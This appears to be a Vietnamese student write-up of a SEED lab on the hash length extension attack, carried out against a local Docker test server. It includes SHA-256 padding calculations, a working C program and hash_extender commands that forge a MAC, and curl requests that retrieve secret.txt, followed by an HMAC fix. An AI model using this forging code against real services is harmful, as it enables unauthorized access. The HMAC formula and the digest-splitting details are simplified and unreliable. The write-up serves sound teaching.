# Hash Length Extension Attack (HLE)

# 1. Chuẩn bị môi trường:

Di chuyển vào thư mục chứa file docker compose và start docker compose:

```bash
cd Labsetup/Labsetup
dcup
```

// **dcup** là cmd được alias sẵn từ VM

Và thêm dòng **'10.9.0.80 www.seedlab-hashlen.com'** vào file `/etc/hosts` sao cho:

![Update host](https://i.imgur.com/zY4nnmv.png)

# 2. Task 1: Send Request to List Files:

Đầu tiên ta sẽ list các key và uid tương ứng trong file `key.txt` (tại đường dẫn: Labsetup/Labsetup/image_flask/app/LabHome):

```
1001:123456
1002:983abe
1003:793zye
**1004:88zjxc**
1005:xciujk
```

Em sẽ **chọn dòng key thứ 4** cho toàn bộ bài lab.

Bên dưới là chuỗi được cấu thành từ **key** nối với **nội dung request** (chỉ có parameters) **được dùng để tạo nên chuỗi MAC:**

> 💡 88zjxc:myname=DuongVinh&uid=1004&lstcmd=1

Có thể dùng lệnh sau để tạo chuỗi MAC (hoặc sign trên dãy data):

```bash
echo -n "88zjxc:myname=DuongVinh&uid=1004&lstcmd=1" | sha256sum
c31f0b37d6d60a5162301dfb1df61238da5c06fcb0be0fea75f027d2c0b45eb1  -
```

![MAC](https://i.imgur.com/aEGmy8n.png)

- Khi đó ta sẽ có chuỗi MAC (signature) là: c31f0b37d6d60a5162301dfb1df61238da5c06fcb0be0fea75f027d2c0b45eb1

Sau khi có chuỗi MAC thì ta có thể gửi request lên server:

```bash
curl "http://www.seedlab-hashlen.com/?myname=DuongVinh&uid=1004&lstcmd=1&mac=c31f0b37d6d60a5162301dfb1df61238da5c06fcb0be0fea75f027d2c0b45eb1"
```

![List file successfully](https://i.imgur.com/9pbGuJP.png)

Có thể thấy request được gửi lên server có địa chỉ MAC hợp lệ và server sẽ list ra 2 file là `secret.txt` và `key.txt`.

Bây giờ, ta sẽ thử download file secret.txt với giá trị MAC cũ:

```bash
curl "http://www.seedlab-hashlen.com/?myname=DuongVinh&uid=1004&lstcmd=1&download=secret.txt&mac=c31f0b37d6d60a5162301dfb1df61238da5c06fcb0be0fea75f027d2c0b45eb1"
```

![Download file failed](https://imgur.com/LwJMejt.png)

Ta có thể thấy nếu sử dụng giá trị MAC cũ thì ta không thể download được file `secret.txt` bởi vì giá trị MAC đó chỉ được tạo cho request với query gồm các parameters: **“myname=DuongVinh&uid=1004&lstcmd=1”**

Vì vậy để có thể download file `secret.txt`, ta cần phải tạo giá trị MAC mới:

```bash
echo -n "88zjxc:myname=DuongVinh&uid=1004&lstcmd=1&download=secret.txt" | sha256sum
cb24212ab81cd8766ec7613ecadaaae0165de49095b700b32416588c017ae198  -
```

![MAC for download file](https://imgur.com/E3KiJ6r.png)

Bây giờ ta sẽ thử download file `secret.txt` với giá trị MAC mới tạo:

```bash
curl "http://www.seedlab-hashlen.com/?myname=DuongVinh&uid=1004&lstcmd=1&download=secret.txt&mac=cb24212ab81cd8766ec7613ecadaaae0165de49095b700b32416588c017ae198"
```

![Download file successfully](https://imgur.com/yizB0yj.png)

Có thể thấy với giá trị MAC mới, ta đã có thể tải thông tin file `secret.txt` về với nội dung như hình.

---

Để tổng hợp lại, ta sẽ có các thông tin sau:

- secret = “88zjxc”
- data = “:myname=DuongVinh&uid=1004&lstcmd=1”
- H = sha256()
- signature = hash(secret||data) = c31f0b37d6d60a5162301dfb1df61238da5c06fcb0be0fea75f027d2c0b45eb1 // “||” ở đây nghĩa là nối (concatenation)
- append = “download=secret.txt” // parameter để tải file secret.txt

> 💡 Vậy để có thể append thêm parameters vào query của request, ta cần phải tạo một MAC mới tương ứng và ta cần phải biết được thông tin **key**.

Tuy nhiên, attacker vẫn có thể vượt qua lớp bảo vệ này nếu attacker biết các thông tin sau đây:

- **Độ dài của secret** (có thể brute force).
- **Thông tin của data**.
- **Thuật toán hashing** (đặc biệt là thuật toán dễ bị tấn công bởi HLE attack).
- **Thông tin về padding**.

> 💡 Khi attacker biết được những thông tin này, thì attacker có thể **append** thêm data và tạo ra một **signature** (MAC) **hợp lệ** cho **data trước đó** + **append data**.

# 3. Task 2: Create Padding

Giả sử như attacker đã biết được 3 trên 4 là: **độ dài secret**, **data** và **thuật toán hashing**, thì bây giờ thông tin còn thiếu là padding.

Thuật toán hasing SHA256 sẽ có block size là 64 bytes, nên data sẽ được padding thêm cho đủ 64 bytes trong quá trình hashing. Giả sử ta chuỗi message M, thì chuỗi padding sẽ bắt đầu với byte là `\x80`, theo sau đó là nhiều bytes `\x00` và cuối cùng là 8 bytes để biễu diễn độ dài của M (số bit của M).

Ta có chuỗi message M: **“88zjxc:myname=DuongVinh&uid=1004&lstcmd=1”**

Kích thước M là: `41 bytes`.

Từ đó, kích thước padding: `64 - 41 = 23 bytes` (bao gồm cả 8 bytes length field).

Kích thước M ở dạng bit là: `41 * 8 = 328 = \x01\x48` (Big-Endian byte order) → `\x00\x00\x00\x00\x00\x00\x01\x48`.

Từ đó ta có chuỗi padding được tạo thành như sau: `1 byte (\x80) + 14 bytes (\x00) + 8 bytes (length) = 23 bytes`.

```
\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x48
```

Để có gửi padding cùng request, ta cần phải encode padding:

```
%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%48
```

Sau khi có được chuỗi padding, ta hãy nói về mục đích của padding trong việc attack:

![A visualization of the first block in SHA256 when the secret || message is less than 1 block long](https://i.imgur.com/TsBW66J.png)

A visualization of the first block in SHA256 when the secret || message is less than 1 block long

Khi hashing, nếu message (secret || message) có kích thước nhỏ hơn block size (64 bytes == 256 bits) thì sha256 sẽ add padding vào cho đủ 64 bytes. Sau khi sha256 add padding vào thì ta có thể thấy sha256(secret || message || padding) và từ đó tạo ra chuỗi MAC mà ta cần. Và khi ta add padding cho block 1 thì dữ liệu padding ta append vào từ đó ta có tính được block 2 dựa trên block 1.

# 4. Task 3: The Length Extension Attack

Sau khi ta có được 4 thông tin: **độ dài secret**, **data, thuật toán hashing**
và **padding**, thì bây giờ ta có thể append thêm dữ liệu và tạo một chuỗi MAC
mới dựa trên chuỗi MAC ban đầu là:
`c31f0b37d6d60a5162301dfb1df61238da5c06fcb0be0fea75f027d2c0b45eb1`

Dựa trên được cung cấp, ta sẽ cắt chuỗi hash thành 8 phần bằng nhau (8 bytes).

```cpp
/* length_ext.c */
#include <arpa/inet.h>
#include <openssl/sha.h>
#include <stdio.h>
int main(int argc, const char *argv[]) {
  int i;
  unsigned char buffer[SHA256_DIGEST_LENGTH];
  SHA256_CTX c;
  SHA256_Init(&c);
  for (i = 0; i < 64; i++)
    SHA256_Update(&c, "*", 1);
  // MAC of the original message M (padded)
  // MAC of the original message: **88zjxc:myname=DuongVinh&uid=1004&lstcmd=1**
	// => Split "c31f0b37d6d60a5162301dfb1df61238da5c06fcb0be0fea75f027d2c0b45eb1" into 8 pieces
  c.h[0] = htole32(0xc31f0b37);
  c.h[1] = htole32(0xd6d60a51);
  c.h[2] = htole32(0x62301dfb);
  c.h[3] = htole32(0x1df61238);
  c.h[4] = htole32(0xda5c06fc);
  c.h[5] = htole32(0xb0be0fea);
  c.h[6] = htole32(0x75f027d2);
  c.h[7] = htole32(0xc0b45eb1);
  // Append additional message
  SHA256_Update(&c, "&download=secret.txt", 20); // NOTE: length of append message is 20
  SHA256_Final(buffer, &c);
  for (i = 0; i < 32; i++) {
    printf("%02x", buffer[i]);
  }
  printf("\n");
  return 0;
}
```

Compile code:

```bash
gcc length_ext.c -o length_ext -lcrypto
```

Sau khi chạy chương trình ta sẽ có chuỗi hash: `b395b1ddcf27279b3a7cdab114c3e5c423cb64ab02645eb55073332fa7563865`

![New MAC for attacking](https://imgur.com/gUg7D2z.png)

Ngoài ra, ta cũng có thể dùng một tool khác từ `iagox86` trên [**Github**](https://github.com/iagox86/hash_extender):

```bash
./hash_extender --data "myname=DuongVinh&uid=1004&lstcmd=1" --secret 7 --append "&download=secret.txt" --signature "c31f0b37d6d60a5162301dfb1df61238da5c06fcb0be0fea75f027d2c0b45eb1" --format sha256
```

Cũng sẽ cho một kết quả tương tự như sử dụng code từ bài Lab cung cấp:

![Using hash_extender tool](https://imgur.com/M45smlk.png)

Để gửi request lên server ta cần gửi theo format sau:

```
http://www.seedlab-hashlen.com/?myname=<name>&uid=<uid>&lstcmd=1<padding>&download=secret.txt&mac=<new-mac>
```

Request lên server:

```
curl "http://www.seedlab-hashlen.com/?myname=DuongVinh&uid=1004&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%48&download=secret.txt&mac=b395b1ddcf27279b3a7cdab114c3e5c423cb64ab02645eb55073332fa7563865"
```

Và ta sẽ lấy được thông tin file `secret.txt` mà không cần biết tới key: **`88zjxc:`**

![Attack successfully](https://imgur.com/uG4OnmR.png)

# 5. Task 4: Attack Mitigation using HMAC

Em sẽ chỉnh lại file `lab.py` tại đường dẫn: `/home/seed/Labsetup/Labsetup/image_flask/app/www/lab.py`

![Edit server to handle HMAC](https://imgur.com/7mCFMCk.png)

Tắt container, build và start lại container để restart lại server:

```bash
dcdown
dcbuild
dcup
```

Khi đó, nếu ta request như trên thì sẽ không còn lấy được thông tin file:

![Failed to attack](https://imgur.com/fXqjBn0.png)

Qua đó có thể thấy việc sử dụng HMAC thay vì MAC thông thường sẽ giúp chống lại Hash length extension attack.

Ta có công thức tính HMAC như sau:

> 💡 HMAC = hash(key + hash(key + message))

Từ đó thông tin về key sẽ được giữ bí mật khi được **hash hai lần**, và key sẽ không bị tấn công bởi phương thức như trên.

---

Ta sẽ tính toán lại HMAC mới dựa trên file code:

```python
#!/bin/env python3
import hmac
import hashlib
key='88zjxc'
message='myname=DuongVinh&uid=1004&lstcmd=1'
mac = hmac.new(bytearray(key.encode('utf-8')),
msg=message.encode('utf-8', 'surrogateescape'),
digestmod=hashlib.sha256).hexdigest()
print(mac)
```

![HMAC](https://imgur.com/YaXOYT7.png)

Request với thông tin HMAC thay vì MAC:

```bash
curl "http://www.seedlab-hashlen.com/?myname=DuongVinh&uid=1004&lstcmd=1&mac=0979328df479c29843561b1fc0976808008d26ba7029e13627f37d1091e28fd3"
```

Lúc này ta đã có thể list được thông tin file:

![HMAC list file successfully](https://imgur.com/YbgGO3N.png)

Sử dụng đoạn code như trên để tạo MAC để download file `secret.txt` là: `5268453a8012dd980f7189bd058ef5008f76a8e22bd1cb1c38530037be607da6`

![HMAC to download file](https://imgur.com/aavD3Oe.png)

Request lên server để tải file `secret.txt`:

```bash
curl "http://www.seedlab-hashlen.com/?myname=DuongVinh&uid=1004&lstcmd=1&download=secret.txt&mac=5268453a8012dd980f7189bd058ef5008f76a8e22bd1cb1c38530037be607da6"
```

![HMAC download file successfully](https://imgur.com/njJJx6U.png)

# 6. Tài liệu tham khảo

- Book.hacktricks.xyz. 2022. *Hash Length Extension Attack - HackTricks*
  . [online] Available at: <https://book.hacktricks.xyz/cryptography/hash-length-extension-attack> [Accessed 23 March 2022].
- NTT Application Security. 2022. *Hash Length Extension Attacks*
  . [online] Available at: <https://www.whitehatsec.com/blog/hash-length-extension-attacks/> [Accessed 23 March 2022].
- Medium. 2022. *Week 17: Hash Length Extensions*
  . [online] Available at: <https://d0nut.medium.com/week-17-hash-length-extensions-7f7e02e62fb5> [Accessed 23 March 2022].
- Bowes, R., 2022. *Everything you need to know about hash length extension attacks » SkullSecurity*
  . [online] Blog.skullsecurity.org. Available at: <https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks> [Accessed 23 March 2022].
- Netifera.com. 2022. [online] Available at: http://netifera.com/research/flickr_api_signature_forgery.pdf [Accessed 23 March 2022].
